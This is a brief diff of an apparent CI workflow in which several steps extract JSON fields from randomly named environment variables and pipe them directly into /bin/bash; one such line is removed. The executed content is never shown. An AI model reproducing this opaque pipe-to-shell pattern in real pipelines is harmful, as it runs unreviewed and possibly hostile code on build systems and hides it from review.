@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$re149" | jq -r .b5044 | /bin/bash
           printf '%s' "$kmv09" | jq -r .oekca66 | /bin/bash
           printf '%s' "$aoixt012" | jq -r .qirct989 | /bin/bash
-          echo $hp9533 | jq -r .ybap4 | /bin/bash
           printf '%s' "$ss9" | jq -r .mqtpa59 | /bin/bash
 
       - name: Upload artifact
